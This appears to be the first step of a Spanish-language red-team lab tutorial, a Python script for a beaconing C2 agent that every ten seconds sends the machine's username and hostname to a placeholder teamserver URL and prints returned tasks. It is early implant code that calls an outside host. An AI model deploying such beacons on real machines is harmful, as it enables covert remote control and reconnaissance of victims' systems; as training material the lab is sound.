# agente.py — Paso 1: tu primer agente
# Un loop que "beaconea": llama a casa cada N segundos y pide tareas.
import json, time, socket, getpass, urllib.request

C2 = "https://TU-C2.run.app"  # el teamserver de la sala, en Cloud Run 

agente = f"{getpass.getuser()}@{socket.gethostname()}"

while True:
    datos = json.dumps({"id": agente}).encode()
    req = urllib.request.Request(C2 + "/beacon", data=datos)
    try:
        tarea = urllib.request.urlopen(req, timeout=5).read().decode()
        if tarea.strip():
            print(f"[{agente}] tarea: {tarea}")
    except Exception:
        pass  
    time.sleep(10)
